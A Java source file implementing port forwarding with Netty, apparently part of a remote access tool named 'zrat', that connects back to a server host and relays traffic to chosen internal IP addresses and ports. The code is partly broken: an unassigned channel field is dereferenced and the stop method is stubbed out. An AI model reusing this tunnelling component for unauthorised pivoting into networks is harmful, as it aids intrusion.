package com.zrat.server.controller;

import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Executors;

import org.jboss.netty.bootstrap.ClientBootstrap;
import org.jboss.netty.channel.Channel;
import org.jboss.netty.channel.ChannelFuture;
import org.jboss.netty.channel.ChannelFutureListener;
import org.jboss.netty.channel.ChannelPipeline;
import org.jboss.netty.channel.ChannelPipelineFactory;
import org.jboss.netty.channel.Channels;
import org.jboss.netty.channel.MessageEvent;
import org.jboss.netty.channel.socket.nio.NioClientSocketChannelFactory;

import com.zrat.server.Server;
import com.zrat.server.nio.handler.SourceForwardingHandler;
import com.zrat.server.nio.handler.TargetForwardingHandler;
import com.zrat.transfer.model.Route;

public class PortForwardingServiceImpl implements PortForwardingService {
//	private static Map<String,Channel> sourceChannel = new HashMap<String,Channel>();
//	private static Map<String,Channel> targetChannel = new HashMap<String,Channel>();
//	private static Map<String,String> portRoute = new HashMap<String,String>();
	
	public static List<Route> routes = new ArrayList<Route>();
	private Channel channel;
	
	/* (non-Javadoc)
	 * @see com.zrat.server.controller.PortForwardingService#startForward(com.zrat.transfer.model.PortForwardingModel)
	 */
	public void startForward(String[] args){
		
		 final ClientBootstrap sourceBootstrap;
		
		 InetSocketAddress sourceAddress = null;
		try {
			sourceAddress = new InetSocketAddress(InetAddress.getByName(Server.HOST).getHostAddress(), Integer.parseInt(args[2]));
		} catch (NumberFormatException e) {
			e.printStackTrace();
		} catch (UnknownHostException e) {
			e.printStackTrace();
		}
		
		
		// Configure the client.
		sourceBootstrap = new ClientBootstrap(
				new NioClientSocketChannelFactory(Executors
						.newCachedThreadPool(), Executors.newCachedThreadPool()));
		sourceBootstrap
				.setPipelineFactory(new ChannelPipelineFactory() {
					@Override
					public ChannelPipeline getPipeline() throws Exception {
						return Channels.pipeline(
		                        new SourceForwardingHandler());
					}
				});
		
		sourceBootstrap.setOption("remoteAddress", sourceAddress);
		sourceBootstrap.connect();
		Route route = new Route();
		route.setSourcePort(args[2]);
		route.setTargetPort(args[1]);
		route.setTargetIp(args[0]);
		routes.add(route);
//		addPortRoute(args[2],args[1]);
	}
	
	public Channel forward(String ip,int port,final MessageEvent e){
		 final ClientBootstrap targetBootstrap;
		// Initialize the timer that schedules subsequent reconnection attempts.

		// Configure the client.
		targetBootstrap = new ClientBootstrap(
				new NioClientSocketChannelFactory(Executors
						.newCachedThreadPool(), Executors.newCachedThreadPool()));
		targetBootstrap
				.setPipelineFactory(new ChannelPipelineFactory() {
					
					@Override
					public ChannelPipeline getPipeline() throws Exception {
						return Channels.pipeline(
		                        new TargetForwardingHandler());
					}
				});
		
		final InetSocketAddress targetAddress = new InetSocketAddress(ip,port);
		targetBootstrap.setOption("remoteAddress", targetAddress);
		ChannelFuture f =  targetBootstrap.connect();
		
		f.addListener(new ChannelFutureListener() {
			@Override
			public void operationComplete(ChannelFuture future) throws Exception {
				future.getChannel().write(e.getMessage());
			}
		});
		
//		channel = f.getChannel();
		
		// Wait for the server to close the connection.
        channel.getCloseFuture().awaitUninterruptibly();

        // Shut down executor threads to exit.
        targetBootstrap.releaseExternalResources();
        
//		channel = f.getChannel();
		return channel;
	}
	
//	public static void addSourceChannel(String id , Channel channel){
//		targetChannel.put(id, channel);
//	}
//	
//	public static void removeSourceChannel(String id){
//		targetChannel.remove(id);
//	}
//	
//	public static Channel getSourceChannel(String id){
//		return sourceChannel.get(getSourcePort(id));
//	}
//	
//	public static void addTargetChannel(String id , Channel channel){
//		targetChannel.put(id, channel);
//	}
//	
//	public static void removeTargetChannel(String id){
//		targetChannel.remove(id);
//	}
//	
//	public static Channel getTargetChannel(String id){
//		return targetChannel.get(getTargetPort(id));
//	}
//	
//	public static void addPortRoute(String sourceAddress,String targetAddress){
//		portRoute.put(sourceAddress, targetAddress);
//	}
//	
//	public static String getTargetPort(String sourceAddress){
//		return portRoute.get(sourceAddress);
//	}
//	
//	public static String getSourcePort(String targetAddress){
//		for (String key :portRoute.keySet()){
//			if (portRoute.get(key).equals(targetAddress)){
//				return key;
//			}
//		}
//		return null;
//	}
	

	
	/* (non-Javadoc)
	 * @see com.zrat.server.controller.PortForwardingService#stopForward()
	 */
	public void stopForward(String[] args){
//		ClientBootstrap targetBootstrap = Server.sourceChannel.get(new InetSocketAddress(Server.HOST, Integer.parseInt(args[2])).toString());
//		 ClientBootstrap sourceBootstrap = Server.targetChannel.get(new InetSocketAddress(args[0], Integer.parseInt(args[1])).toString());
//		if (targetBootstrap != null)
//		targetBootstrap.releaseExternalResources();
//		if (sourceBootstrap != null)
//		sourceBootstrap.releaseExternalResources();
	}
}
